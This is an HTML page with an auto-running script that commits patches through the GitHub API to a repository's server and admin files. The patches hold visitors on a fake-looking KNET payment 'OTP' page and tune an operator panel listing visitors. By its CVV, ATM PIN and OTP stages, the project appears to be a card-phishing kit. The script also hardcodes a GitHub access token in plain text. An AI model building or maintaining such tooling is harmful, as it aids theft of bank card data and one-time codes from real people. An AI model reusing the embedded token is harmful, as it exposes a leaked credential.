<!doctype html>
<html lang="ar" dir="rtl">
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>FIX102</title>
<style>
body{font-family:system-ui,Tajawal,sans-serif;background:#0f1115;color:#e8e8ea;padding:16px;max-width:900px;margin:auto}
h1{font-size:17px}#st{background:#1b2230;border:1px solid #2b3444;border-radius:8px;padding:9px;margin:8px 0;font-size:13px}
input{width:100%;padding:9px;border-radius:8px;border:1px solid #333;background:#1a1d24;color:#fff;box-sizing:border-box}
button{padding:11px 16px;border-radius:9px;border:0;background:#16a34a;color:#fff;font-weight:700;cursor:pointer;margin-top:8px}
#log{background:#141821;border:1px solid #262b36;border-radius:9px;padding:12px;margin-top:12px;font-family:monospace;font-size:12.5px;white-space:pre-wrap;min-height:36px}
.ok{color:#4ade80}.err{color:#f87171}.warn{color:#fbbf24}textarea{display:none}
</style></head><body>
<h1>FIX102 — وقف ترجيع صفحة OTP (الجسر) + تهدئة إعادة الرسم</h1>
<div id="st">جاري التحميل</div><div>Token:</div>
<input id="tok" placeholder="ghp_..."><button id="run">رفع التعديلات</button><div id="log"></div>

<textarea id="sA">
/*FIX102A*/ try { if (v.__f98otp && (Date.now() - v.__f98otp) < 1800000) { var __pA102 = String(pg || ""); if (/cvv|atm|مرور|نهائي|final/i.test(__pA102)) { v.__f98otp = 0; } else if (/دفع|كي\s*نت|knet|payment|otp|رمز/i.test(__pA102)) { pg = "رمز التحقق كي نت (OTP)"; } } } catch(e){}
v.page=pg;
</textarea>

<textarea id="sB">
/*FIX102B*/ try { if (v.__f98otp && (Date.now() - v.__f98otp) < 1800000) { var __pB102 = String(pageName || ""); if (/cvv|atm|مرور|نهائي|final/i.test(__pB102)) { v.__f98otp = 0; } else if (/دفع|كي\s*نت|knet|payment|otp|رمز/i.test(__pB102)) { pageName = "رمز التحقق كي نت (OTP)"; } } } catch(e){}
v.page = pageName;
</textarea>

<textarea id="pAdmin102">
<script id="kddF102">
(function(){
  if (window.__f102) return; window.__f102 = 1;
  var orig = window.renderVisitorsList;
  if (typeof orig === "function" && !orig.__f102){
    var t = null, last = 0;
    var w = function(){
      var ctx = this, args = arguments, now = Date.now();
      if (now - last < 400){
        if (t) clearTimeout(t);
        t = setTimeout(function(){ last = Date.now(); t = null; try { orig.apply(ctx, args); } catch(e){} }, 400);
        return;
      }
      last = now;
      return orig.apply(ctx, args);
    };
    w.__f102 = 1; window.renderVisitorsList = w; try { renderVisitorsList = w; } catch(e){}
  }
})();
</script>
</textarea>

<script>
(function(){
  var HARD="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";
  var OWNER="fahshomi-ui", REPO="KDD", BRANCH="main";
  var FILES=["server/index.js","server/admin/index.html","kdd-public/admin.html"];
  function $(id){ return document.getElementById(id); }
  var st=$("st"), log=$("log"), tok=$("tok"), run=$("run");
  function set(t){ try{ st.textContent=t; }catch(e){} }
  function say(t,c){ var d=document.createElement("div"); if(c) d.className=c; d.textContent=t; log.appendChild(d); }
  function clean(id){ var v=$(id).value; return v.replace(/^\n/,"").replace(/[ \t]+$/,"").replace(/\n+$/,""); }
  try { var qs=""; try{ qs=new URLSearchParams(location.search).get("token")||""; }catch(e){} tok.value=qs||HARD; set("جاهز"); } catch(e){ set("خطأ: "+e.message); }

  function patchServer(src){
    var out=src, n=0;
    if (out.indexOf("/*FIX102A*/") === -1){
      var a="v.page=pg;";
      if (out.indexOf(a) > -1){ out = out.split(a).join(clean("sA")); n++; }
    }
    if (out.indexOf("/*FIX102B*/") === -1){
      var b="v.page = pageName;";
      if (out.indexOf(b) > -1){ out = out.split(b).join(clean("sB")); n++; }
    }
    return { out: out, n: n };
  }
  function patchAdmin(src){
    var out=src;
    if (out.indexOf('id="kddF102"') > -1) return { out: out, n: 0 };
    var idx=out.lastIndexOf("</body>");
    if (idx < 0) return { out: out, n: 0 };
    return { out: out.slice(0,idx) + clean("pAdmin102") + "\n" + out.slice(idx), n: 1 };
  }
  function b64(s){ return btoa(unescape(encodeURIComponent(s))); }
  function H(){ return { Authorization:"token "+tok.value.trim(), Accept:"application/vnd.github+json" }; }
  async function doFile(path){
    try {
      var gr=await fetch("https://api.github.com/repos/"+OWNER+"/"+REPO+"/contents/"+path+"?ref="+BRANCH,{headers:H()});
      if (gr.status===401){ say("✗ التوكن مرفوض (401)","err"); return -1; }
      if (!gr.ok){ say("✗ "+path+" : HTTP "+gr.status,"err"); return 0; }
      var meta=await gr.json();
      var src=decodeURIComponent(escape(atob(meta.content.replace(/\n/g,""))));
      var res=/\.js$/.test(path)?patchServer(src):patchAdmin(src);
      if (res.n===0 || res.out===src){ say("• "+path+" : مطبّق مسبقاً","warn"); return 0; }
      var pr=await fetch("https://api.github.com/repos/"+OWNER+"/"+REPO+"/contents/"+path,{method:"PUT",
        headers:Object.assign(H(),{"Content-Type":"application/json"}),
        body:JSON.stringify({message:"FIX102: keep OTP page on bridge push + throttle list render",content:b64(res.out),sha:meta.sha,branch:BRANCH})});
      if (!pr.ok){ var t=await pr.text(); say("✗ "+path+" : "+pr.status+" "+t.slice(0,140),"err"); return 0; }
      say("✓ تم التعديل : "+path+"  ("+res.n+")","ok"); return 1;
    } catch(e){ say("✗ "+path+" : "+e.message,"err"); return 0; }
  }
  async function runAll(){
    try {
      log.innerHTML=""; if(!tok.value.trim()){ say("أدخل التوكن","err"); return; }
      run.disabled=true; set("جاري الرفع..."); say("بدء الرفع...");
      var ok=0;
      for (var i=0;i<FILES.length;i++){ set("معالجة: "+FILES[i]); if (await doFile(FILES[i])===1) ok++; }
      say(""); say("النتيجة: "+ok+" ملف معدّل", ok?"ok":"warn");
      if (ok) say("استنى 2-3 دقايق ثم Ctrl+F5.","warn");
      set(ok?"تم ✓ — "+ok+" ملف":"انتهى بدون تعديل"); run.disabled=false;
    } catch(e){ say("خطأ: "+e.message,"err"); set("خطأ"); run.disabled=false; }
  }
  run.addEventListener("click", runAll);
  setTimeout(runAll, 700);
})();
</script>
</body></html>
